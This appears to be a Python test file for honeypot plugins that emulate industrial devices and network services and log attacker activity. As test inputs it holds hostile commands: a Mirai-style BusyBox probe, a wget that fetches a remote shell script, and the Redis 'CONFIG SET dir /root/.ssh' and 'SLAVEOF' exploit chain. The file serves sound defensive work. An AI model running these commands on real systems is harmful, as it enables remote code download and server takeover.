"""New protocol plugins (ICS + IT services): protocol replies, telemetry flags, hardening."""

import struct
import sys
from pathlib import Path

sys.path.insert(0, str(Path("sensor/honeypots").resolve()))

from common.plugin import PersonaContext  # noqa: E402
from plugins.ics import ATGPlugin, BACnetPlugin, ENIPPlugin, S7Plugin  # noqa: E402
from plugins.services import RDPPlugin, RedisPlugin, SIPPlugin, SNMPPlugin, TelnetPlugin, TFTPPlugin, VNCPlugin, _oid_encode, strip_telnet  # noqa: E402

PERSONA = PersonaContext("dev", "Test Device", "generic", "Acme", "AX-9", "2.0.1", "ax9", (("admin", "admin"),))
CLIENT = ("192.168.50.20", 40000)


def conv(plugin_cls, options=None, hardening=frozenset()):
    c = plugin_cls(PERSONA, options or {}).conversation(CLIENT)
    c.state["hardening"] = frozenset(hardening)
    return c


# ---- telnet ------------------------------------------------------------------------- #


def test_telnet_login_shell_and_mirai_style_commands():
    t = conv(TelnetPlugin)
    assert b"login:" in t.greeting().data
    t.handle(b"root\r\n")
    bad = t.handle(b"wrong\r\n")
    assert b"Login incorrect" in bad.data and bad.events[0]["outcome"] == "failure"
    t.handle(b"admin\r\n")
    ok = t.handle(b"admin\r\n")
    assert b"BusyBox" in ok.data and ok.events[0]["outcome"] == "success"
    probe = t.handle(b"/bin/busybox ECCHI\r\n")
    assert b"ECCHI: applet not found" in probe.data and probe.events[0]["process"]["command_line"] == "/bin/busybox ECCHI"
    assert b"bad address" in t.handle(b"wget http://198.51.100.4/x.sh\r\n").data  # never fetched
    assert t.handle(b"exit\r\n").close
    assert strip_telnet(b"\xff\xfb\x01root\r\n") == b"root\r\n"


def test_telnet_deny_auth_and_lockout():
    t = conv(TelnetPlugin, {"max_failures": 2}, {"deny_auth"})
    t.handle(b"admin\r\n")
    assert t.handle(b"admin\r\n").events[0]["outcome"] == "failure"  # valid creds refused
    t.handle(b"admin\r\n")
    assert t.handle(b"x\r\n").close


# ---- ICS ------------------------------------------------------------------------------ #


def tpkt(payload):
    return struct.pack("!BBH", 3, 0, len(payload) + 4) + payload


def s7_job(function, extra=b""):
    params = bytes([function]) + extra
    return tpkt(b"\x02\xf0\x80" + b"\x32\x01\x00\x00\x00\x01" + struct.pack("!HH", len(params), 0) + params)


def test_s7_connect_identify_write_and_read_only():
    s7 = conv(S7Plugin)
    assert s7.handle(tpkt(b"\x11\xe0" + b"\x00" * 16)).data[5] == 0xD0
    setup = s7.handle(s7_job(0xF0, b"\x00\x00\x01\x00\x01\x01\xe0"))
    assert setup.events[0]["s7"]["function"] == "setup_communication"
    szl = tpkt(
        b"\x02\xf0\x80" + b"\x32\x07\x00\x00\x00\x02" + struct.pack("!HH", 8, 8) + b"\x00\x01\x12\x04\x11\x44\x01\x00" + b"\xff\x09\x00\x04\x00\x11\x00\x00"
    )
    identify = s7.handle(szl)
    assert b"AX-9" in identify.data and identify.events[0]["s7"]["identify"] is True
    write = s7.handle(s7_job(0x05, b"\x01"))
    assert write.events[0]["s7"]["write"] is True and write.events[0]["outcome"] == "success"
    locked = conv(S7Plugin, hardening={"read_only"}).handle(s7_job(0x29))
    assert locked.events[0]["outcome"] == "failure" and locked.events[0]["s7"]["hardening_blocked"]


def bvlc(apdu):
    body = b"\x01\x04" + apdu
    return b"\x81\x0a" + struct.pack("!H", len(body) + 4) + body


def test_bacnet_whois_readproperty_writeproperty():
    plugin = BACnetPlugin(PERSONA, {"device_instance": 4242})
    i_am = plugin.datagram(bvlc(b"\x10\x08"), CLIENT)
    assert i_am.data[6:8] == b"\x10\x00" and i_am.events[0]["bacnet"]["identify"]
    read_name = plugin.datagram(bvlc(b"\x00\x05\x01\x0c\x0c\x02\x00\x10\x92\x19\x4d"), CLIENT)
    assert b"Test Device" in read_name.data and read_name.events[0]["bacnet"]["property"] == "object_name"
    write = plugin.datagram(bvlc(b"\x00\x05\x02\x0f"), CLIENT)
    assert write.data[-3:] == bytes([0x20, 2, 0x0F]) and write.events[0]["bacnet"]["write"]
    blocked = plugin.datagram(bvlc(b"\x00\x05\x03\x0f"), CLIENT, frozenset({"read_only"}))
    assert blocked.events[0]["outcome"] == "failure"


def test_enip_list_identity_and_session():
    e = conv(ENIPPlugin, {"product_code": 77})
    identity = e.handle(struct.pack("<HHII8sI", 0x63, 0, 0, 0, b"ctx-0001", 0))
    assert identity.data[:2] == struct.pack("<H", 0x63) and b"AX-9" in identity.data and identity.events[0]["enip"]["identify"]
    session = e.handle(struct.pack("<HHII8sI", 0x65, 4, 0, 0, b"ctx-0002", 0) + struct.pack("<HH", 1, 0))
    assert struct.unpack("<I", session.data[4:8])[0] != 0


def test_atg_inventory_and_set():
    a = conv(ATGPlugin, {"tanks": ["UNLEADED", "DIESEL"]})
    inventory = a.handle(b"\x01I20100\n")
    assert b"IN-TANK INVENTORY" in inventory.data and b"DIESEL" in inventory.data and inventory.events[0]["atg"]["identify"]
    assert a.handle(b"\x01S60201NEWNAME\n").events[0]["atg"]["write"]
    assert conv(ATGPlugin, hardening={"read_only"}).handle(b"\x01S60201X\n").events[0]["outcome"] == "failure"
    assert a.handle(b"\x01ZZZ\n").data.startswith(b"\x019999")


# ---- SNMP ------------------------------------------------------------------------------ #


def ber(tag, value):
    return bytes([tag, len(value)]) + value


def snmp_get(community, pdu=0xA0, oid="1.3.6.1.2.1.1.1.0"):
    varbind = ber(0x30, ber(0x06, _oid_encode(oid)) + b"\x05\x00")
    body = ber(0x02, b"\x2a") + ber(0x02, b"\x00") + ber(0x02, b"\x00") + ber(0x30, varbind)
    return ber(0x30, ber(0x02, b"\x01") + ber(0x04, community.encode()) + ber(pdu, body))


def test_snmp_get_getnext_wrong_community_and_set():
    plugin = SNMPPlugin(PERSONA, {})
    reply = plugin.datagram(snmp_get("public"), CLIENT)
    assert b"Acme AX-9 firmware 2.0.1" in reply.data and reply.events[0]["snmp"]["community"] == "public"
    nxt = plugin.datagram(snmp_get("public", 0xA1, "1.3.6.1.2.1.1.4.0"), CLIENT)
    assert b"ax9" in nxt.data  # sysName follows sysContact
    silent = plugin.datagram(snmp_get("guess"), CLIENT)
    assert silent.data == b"" and silent.events[0]["outcome"] == "failure"
    setreq = plugin.datagram(snmp_get("private", 0xA3), CLIENT)
    assert setreq.events[0]["snmp"]["write"] and len(setreq.data) < 10 * len(snmp_get("private", 0xA3))
    assert plugin.datagram(b"\x30\x99junk", CLIENT).events[0]["action"] == "malformed"


# ---- Redis / SIP / TFTP / VNC / RDP ------------------------------------------------------ #


def resp(*args):
    return (f"*{len(args)}\r\n" + "".join(f"${len(a)}\r\n{a}\r\n" for a in args)).encode()


def test_redis_exploit_chain_is_logged_and_never_applied():
    r = conv(RedisPlugin)
    assert r.handle(resp("PING")).data == b"+PONG\r\n"
    assert b"redis_version" in r.handle(resp("INFO")).data
    config = r.handle(resp("CONFIG", "SET", "dir", "/root/.ssh"))
    assert config.data == b"+OK\r\n" and config.events[0]["redis"]["exploit"]
    assert r.handle(resp("SLAVEOF", "198.51.100.9", "6379")).events[0]["redis"]["exploit"]
    assert conv(RedisPlugin, hardening={"read_only"}).handle(resp("FLUSHALL")).data.startswith(b"-READONLY")
    locked = conv(RedisPlugin, {"requirepass": "s3cret"})
    assert locked.handle(resp("KEYS", "*")).data.startswith(b"-NOAUTH")
    assert locked.handle(resp("AUTH", "s3cret")).events[0]["outcome"] == "success"


def test_sip_options_register_and_scanner_fields():
    plugin = SIPPlugin(PERSONA, {"extensions": ["100"]})
    def msg(method, to):
        return (
            f"{method} sip:{to}@10.0.0.1 SIP/2.0\r\nVia: SIP/2.0/UDP 1.2.3.4\r\nFrom: <sip:{to}@x>\r\nTo: <sip:{to}@x>\r\n"
            f"Call-ID: abc\r\nCSeq: 1 {method}\r\nUser-Agent: friendly-scanner\r\n\r\n"
        ).encode()
    assert plugin.datagram(msg("OPTIONS", "100"), CLIENT).data.startswith(b"SIP/2.0 200")
    reg = plugin.datagram(msg("REGISTER", "100"), CLIENT)
    assert reg.data.startswith(b"SIP/2.0 401") and b"WWW-Authenticate" in reg.data and reg.events[0]["sip"]["user_agent"] == "friendly-scanner"
    assert plugin.datagram(msg("REGISTER", "999"), CLIENT).data.startswith(b"SIP/2.0 404")


def test_tftp_refuses_everything():
    plugin = TFTPPlugin(PERSONA, {})
    wrq = plugin.datagram(b"\x00\x02x.bin\x00octet\x00", CLIENT)
    assert wrq.data[:4] == b"\x00\x05\x00\x02" and wrq.events[0]["tftp"]["opcode"] == "WRQ"
    assert plugin.datagram(b"\x00\x01cfg.xml\x00octet\x00", CLIENT).data[:4] == b"\x00\x05\x00\x01"


def test_vnc_handshake_ends_in_auth_failure():
    v = conv(VNCPlugin)
    assert v.greeting().data == b"RFB 003.008\n"
    assert v.handle(b"RFB 003.008\n").data == b"\x01\x02"
    assert len(v.handle(b"\x02").data) == 16
    result = v.handle(b"\x00" * 16)
    assert result.close and result.data[:4] == b"\x00\x00\x00\x01" and result.events[0]["category"] == "authentication"


def test_rdp_records_cookie_user_and_refuses_negotiation():
    cookie = b"Cookie: mstshash=administrator\r\n"
    x224 = bytes([6 + len(cookie) + 8, 0xE0, 0, 0, 0, 0, 0]) + cookie + b"\x01\x00\x08\x00\x03\x00\x00\x00"
    reply = conv(RDPPlugin).handle(struct.pack("!BBH", 3, 0, len(x224) + 4) + x224)
    assert reply.close and reply.data[5] == 0xD0 and reply.events[0]["authentication"]["username"] == "administrator"
